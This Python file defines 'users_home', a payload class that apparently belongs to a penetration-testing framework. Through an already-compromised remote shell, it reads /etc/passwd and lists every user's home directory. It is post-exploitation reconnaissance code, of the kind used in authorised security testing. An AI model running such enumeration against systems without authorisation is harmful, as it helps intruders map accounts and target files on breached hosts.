import re
from plugins.attack.payloads.base_payload import base_payload

class users_home(base_payload):
    '''
    '''
    def run_read(self):
        result = []
        users = []

        def parse_users_home( etc_passwd ):
            user = re.findall('(?<=/home/)(.*?)\:', etc_passwd)
            if user:
                return user
            else:
                return ''

        for user in parse_users_home(self.shell.read('/etc/passwd')):
            result.append('/home/'+str(user)+'/')
        
        return result
